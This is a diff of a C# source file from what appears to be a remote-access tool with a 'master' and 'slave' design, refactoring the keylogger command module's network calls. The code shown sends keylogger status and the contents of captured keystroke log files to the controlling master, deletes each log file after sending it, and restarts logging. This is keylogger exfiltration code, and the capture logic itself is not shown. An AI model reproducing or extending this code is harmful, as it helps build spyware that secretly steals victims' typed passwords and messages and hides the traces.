@@ -1,8 +1,7 @@
-﻿using System;
-using Shared;
-using Slave.Commands.Core;
+﻿using Shared;
 using System.Collections.Generic;
 using System.IO;
+using Slave.Core;
 
 namespace Slave.Commands.KeyLogger
 {
@@ -47,7 +46,7 @@ namespace Slave.Commands.KeyLogger
         }
 
         void SendKeyloggerStatusToMaster() =>
-            SlaveCommandsManager.networkManager.WriteLine(keyLoggerManager.GetStatus() ? "on" : "off");
+            SlaveNetworkManager.GetInstance().WriteLine(keyLoggerManager.GetStatus() ? "on" : "off");
 
         void SendKeyLogsToMaster()
         {
@@ -57,19 +56,19 @@ namespace Slave.Commands.KeyLogger
             foreach (var file in logFiles)
             {
                 var fileName = file.Substring(file.LastIndexOf('\\') + 1);
-                GlobalCommandsManager.networkManager.WriteLine(fileName);
+                SlaveNetworkManager.GetInstance().WriteLine(fileName);
                 try
                 {
-                    GlobalCommandsManager.networkManager.WriteLine(File.ReadAllText(file));
+                    SlaveNetworkManager.GetInstance().WriteLine(File.ReadAllText(file));
                     File.Delete(file);
                 }
                 catch (IOException)
                 {
                     // Couldn't read file : send error
-                    GlobalCommandsManager.networkManager.WriteLine($"KO:{fileName}");
+                    SlaveNetworkManager.GetInstance().WriteLine($"KO:{fileName}");
                 }
             }
-            GlobalCommandsManager.networkManager.WriteLine("{end}");
+            SlaveNetworkManager.GetInstance().WriteLine("{end}");
 
             keyLoggerManager.StartFileLogging();
         }
